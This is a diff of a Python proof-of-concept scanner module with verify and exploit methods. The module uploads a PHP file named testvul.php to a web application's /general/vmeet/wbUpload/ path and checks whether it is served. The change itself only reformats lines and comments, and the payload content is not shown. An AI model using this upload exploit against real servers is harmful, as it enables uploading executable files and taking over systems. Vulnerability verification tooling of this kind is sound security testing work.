@@ -39,9 +39,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -61,7 +62,7 @@ testvul...\r
             #proxy = ('127.0.0.1', 8887)
             code, head, res, errcode, _ = hh.http(
                 upload_url, post=post_data, header=content_type)
-            #print head
+            # print head
             if code != 200:
                 return False
             verify_url = self.target + '/general/vmeet/wbUpload/testvul.php'
@@ -75,7 +76,8 @@ testvul...\r
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -96,7 +98,7 @@ testvul...\r
             #proxy = ('127.0.0.1', 8887)
             code, head, res, errcode, _ = hh.http(
                 upload_url, post=post_data, header=content_type)
-            #print head
+            # print head
             if code != 200:
                 return False
             verify_url = self.target + '/general/vmeet/wbUpload/testvul.php'
